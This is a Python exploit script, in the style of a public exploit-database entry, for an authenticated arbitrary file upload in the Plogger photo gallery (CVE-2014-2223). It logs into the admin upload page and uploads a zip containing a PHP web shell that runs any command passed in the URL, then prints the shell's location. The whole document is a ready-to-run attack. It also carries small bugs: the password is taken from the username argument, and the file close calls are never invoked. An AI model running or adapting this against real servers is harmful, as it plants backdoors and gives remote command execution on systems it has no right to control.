 
 
# Exploit Title: Plogger Authenticated Arbitrary File Upload
# Date: Feb 2014
# Exploit Author: b0z
# Vendor Homepage: www.plogger.org
# Software Link: www.plogger.org/download
# Version: Plogger prior to 1.0-RC1
# CVE : 2014-2223
 
import hashlib
import os
import zipfile
 
import requests
import time
import argparse
 
 
 
def login(session,host,username,password):
    print "[+] Log in"
 
    session.post(&#039;http://%s/plog-admin/plog-upload.php&#039; % host, data={
        "plog_username": username,
        "plog_password": password,
        "action": "log_in"
    })
 
def upload(session):
    print "[+] Creating poisoned gift"
    ## Write the backdoor
    backdoor = open(magic + &#039;.php&#039;, &#039;w+&#039;, buffering = 0)
    backdoor.write("<?php system($_GET[&#039;cmd&#039;]) ?>")
    backdoor.close
 
    # Add true image file to block the race condition (mandatory not null)
    image = open(magic + &#039;.png&#039;, &#039;w+&#039;, buffering = 0)
    image.write(&#039;A&#039;)
    image.close
 
    gift = zipfile.ZipFile(magic + &#039;.zip&#039;, mode = &#039;w&#039;)
    gift.write(magic + &#039;.php&#039;)
    gift.write(magic + &#039;.png&#039;)
    gift.close
 
    os.remove(magic + &#039;.php&#039;)
    os.remove(magic + &#039;.png&#039;)
 
    gift = open(magic + &#039;.zip&#039;, &#039;rb&#039;)
    files= { "userfile": ("archive.zip", gift)}
    session.post(&#039;http://%s/plog-admin/plog-upload.php&#039; % host, files=files,
        data = {
            "destination_radio":"existing",
            "albums_menu" : "1",
            "new_album_name":"",
            "collections_menu":"1",
            "upload":"Upload"
    })
 
    os.remove(magic + &#039;.zip&#039;)
    print &#039;[+] Here we go ==> http://%s/plog-content/uploads/archive/%s.php&#039; % (host,magic)
 
if __name__== "__main__":
 
    parser = argparse.ArgumentParser()
    parser.add_argument("--host"        , help="Remote host",required=True)
    parser.add_argument("--user"        , help="Username",required=True)
    parser.add_argument("--password"    , help="Password",required=True)
    args = parser.parse_args()
 
    host     = args.host
    username = args.user
    password = args.user
 
    magic = hashlib.sha1(time.asctime()).hexdigest()
 
    session = requests.session()
    login(session,host,username,password)
    upload(session)

